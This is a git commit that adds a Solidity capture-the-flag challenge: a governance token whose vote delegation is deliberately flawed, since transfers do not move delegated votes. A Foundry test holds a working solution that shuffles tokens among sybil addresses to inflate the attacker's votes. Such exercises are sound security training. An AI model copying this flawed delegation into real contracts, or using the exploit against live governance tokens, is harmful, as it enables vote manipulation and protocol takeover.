4e3c8c3ff4bef9e77062352119e8149bbb8d6ee2
0xToshii <94262432+0xToshii@users.noreply.github.com>
2023-02-02 16:28:29 -0800

    governance-shenanigans

---
+++ src/governance-shenanigans/NotSushiToken.sol
@@ -0,0 +1,198 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+
+
+// NotSushiToken with Governance.
+contract NotSushiToken is ERC20("NotSushi", "NotSushi"), Ownable {
+
+    using SafeMath for uint256;
+
+    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner.
+    /// @dev votes are not delegated during mint
+    function mint(address _to, uint256 _amount) public onlyOwner {
+        _mint(_to, _amount);
+        _moveDelegates(address(0), address(0), _amount); // delegation not allowed in mint
+    }
+
+    /// @notice A record of each accounts delegate
+    mapping (address => address) internal _delegates;
+
+    /// @notice A checkpoint for marking number of votes from a given block
+    struct Checkpoint {
+        uint32 fromBlock;
+        uint256 votes;
+    }
+
+    /// @notice A record of votes checkpoints for each account, by index
+    mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;
+
+    /// @notice The number of checkpoints for each account
+    mapping (address => uint32) public numCheckpoints;
+
+    /// @notice Keeps track of whether an address is WLed
+    mapping (address => bool) private wled;
+
+    /// @notice An event thats emitted when an account changes its delegate
+    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
+
+    /// @notice An event thats emitted when a delegate account's vote balance changes
+    event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);
+
+    /// @notice Only allows WLed voters
+    modifier onlyWledVoter() {
+        require(wled[msg.sender],'!WLed address');
+        _;
+    }
+
+    /**
+     * @notice Delegate votes from `msg.sender` to `delegatee`
+     * @param delegator The address to get delegatee for
+     */
+    function delegates(address delegator)
+        external
+        view
+        returns (address)
+    {
+        return _delegates[delegator];
+    }
+
+    /// @dev adds address as WLed voters - WLs cannot be later revoked
+    function addWledAddresses(address[] calldata _toAdds) external onlyOwner {
+        for (uint i=0; i<_toAdds.length; ++i) {
+            wled[_toAdds[i]]=true;
+        }
+    }
+
+   /**
+    * @notice Delegate votes from `msg.sender` to `delegatee`
+    * @dev only WLed addresses are allowed to delegate votes
+    * @param delegatee The address to delegate votes to
+    */
+    function delegate(address delegatee) external onlyWledVoter {
+        return _delegate(msg.sender, delegatee);
+    }
+
+    /**
+     * @notice Gets the current votes balance for `account`
+     * @param account The address to get votes balance
+     * @return The number of current votes for `account`
+     */
+    function getCurrentVotes(address account)
+        external
+        view
+        returns (uint256)
+    {
+        uint32 nCheckpoints = numCheckpoints[account];
+        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;
+    }
+
+    /**
+     * @notice Determine the prior number of votes for an account as of a block number
+     * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.
+     * @param account The address of the account to check
+     * @param blockNumber The block number to get the vote balance at
+     * @return The number of votes the account had as of the given block
+     */
+    function getPriorVotes(address account, uint blockNumber)
+        external
+        view
+        returns (uint256)
+    {
+        require(blockNumber < block.number, "SUSHI::getPriorVotes: not yet determined");
+
+        uint32 nCheckpoints = numCheckpoints[account];
+        if (nCheckpoints == 0) {
+            return 0;
+        }
+
+        // First check most recent balance
+        if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) {
+            return checkpoints[account][nCheckpoints - 1].votes;
+        }
+
+        // Next check implicit zero balance
+        if (checkpoints[account][0].fromBlock > blockNumber) {
+            return 0;
+        }
+
+        uint32 lower = 0;
+        uint32 upper = nCheckpoints - 1;
+        while (upper > lower) {
+            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow
+            Checkpoint memory cp = checkpoints[account][center];
+            if (cp.fromBlock == blockNumber) {
+                return cp.votes;
+            } else if (cp.fromBlock < blockNumber) {
+                lower = center;
+            } else {
+                upper = center - 1;
+            }
+        }
+        return checkpoints[account][lower].votes;
+    }
+
+    /// @dev assigns entire balance of votes from old delagatee to new delagatee
+    function _delegate(address delegator, address delegatee)
+        internal
+    {
+        address currentDelegate = _delegates[delegator];
+        uint256 delegatorBalance = balanceOf(delegator); // balance of underlying SUSHIs (not scaled);
+        _delegates[delegator] = delegatee;
+
+        emit DelegateChanged(delegator, currentDelegate, delegatee);
+
+        _moveDelegates(currentDelegate, delegatee, delegatorBalance);
+    }
+
+    /// @dev votes are transfered from delegatee `srcRep` to `dstRep`
+    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
+        if (srcRep != dstRep && amount > 0) {
+            if (srcRep != address(0)) {
+                // decrease old representative
+                uint32 srcRepNum = numCheckpoints[srcRep];
+                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
+                uint256 srcRepNew = srcRepOld.sub(amount);
+                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
+            }
+
+            if (dstRep != address(0)) {
+                // increase new representative
+                uint32 dstRepNum = numCheckpoints[dstRep];
+                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
+                uint256 dstRepNew = dstRepOld.add(amount);
+                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
+            }
+        }
+    }
+
+    /// @dev update the recorded vote count for a given `delegatee` at blockNumber
+    function _writeCheckpoint(
+        address delegatee,
+        uint32 nCheckpoints,
+        uint256 oldVotes,
+        uint256 newVotes
+    )
+        internal
+    {
+        uint32 blockNumber = safe32(block.number, "SUSHI::_writeCheckpoint: block number exceeds 32 bits");
+
+        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) { // same block update
+            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
+        } else { // new block update
+            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);
+            numCheckpoints[delegatee] = nCheckpoints + 1;
+        }
+
+        emit DelegateVotesChanged(delegatee, oldVotes, newVotes);
+    }
+
+    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {
+        require(n < 2**32, errorMessage);
+        return uint32(n);
+    }
+
+}
---
+++ test/10-governance-shenanigans.sol
@@ -0,0 +1,95 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+// utilities
+import {Test} from "forge-std/Test.sol";
+import {console} from "forge-std/console.sol";
+// core contracts
+import {NotSushiToken} from "src/governance-shenanigans/NotSushiToken.sol";
+
+
+contract Testing is Test {
+
+    address attacker = makeAddr('attacker'); // WLed address 1
+    address o1 = makeAddr('o1'); // WLed address 2
+    address o2 = makeAddr('o2'); // WLed address 3
+    address admin = makeAddr('admin'); // should not be used
+    address adminUser = makeAddr('adminUser'); // should not be used
+
+    NotSushiToken governanceToken;
+
+    /// preliminary state
+    function setUp() public {
+
+        // funding accounts
+        vm.deal(admin, 10_000 ether);
+        vm.deal(attacker, 10_000 ether);
+        vm.deal(adminUser, 10_000 ether);
+
+        // setting up governance token
+        vm.prank(admin);
+        governanceToken = new NotSushiToken();
+
+        // --attacker sybil attack - got 3 controlled addresses WLed
+        address[] memory addresses = new address[](4);
+        addresses[0]=adminUser; addresses[1]=attacker;
+        addresses[2]=o1; addresses[3]=o2;
+
+        vm.prank(admin);
+        governanceToken.addWledAddresses(addresses);
+
+        vm.prank(admin);
+        governanceToken.mint(adminUser,2_000e18);
+        vm.prank(admin);
+        governanceToken.mint(attacker,500e18);
+
+        // adminUser delegates all votes to himself
+        vm.prank(adminUser);
+        governanceToken.delegate(adminUser);
+
+    }
+
+    /// solves the challenge
+    function testChallengeExploit() public {
+        /// for this exploit, you can use vm.prank(..) w/ {attacker,o1,o2}
+
+        vm.prank(attacker);
+        governanceToken.transfer(o1,499e18);
+        vm.prank(attacker);
+        governanceToken.delegate(adminUser);
+
+        vm.prank(o1);
+        governanceToken.transfer(attacker,499e18);
+        vm.prank(attacker);
+        governanceToken.delegate(attacker);
+
+        vm.prank(attacker);
+        governanceToken.transfer(o1,1e18);
+        vm.prank(o1);
+        governanceToken.delegate(adminUser);
+
+        vm.prank(attacker);
+        governanceToken.transfer(o1,499e18);
+        vm.prank(o1);
+        governanceToken.delegate(attacker);
+
+        vm.prank(o1);
+        governanceToken.transfer(o2,500e18);
+        vm.prank(o2);
+        governanceToken.delegate(attacker);
+        
+        validation();
+    }
+
+    /// expected final state
+    function validation() public {
+
+        // attacker gets more delegated votes than adminUser
+        assertGt(
+            governanceToken.getCurrentVotes(attacker),
+            governanceToken.getCurrentVotes(adminUser)
+        );
+
+    }
+
+}
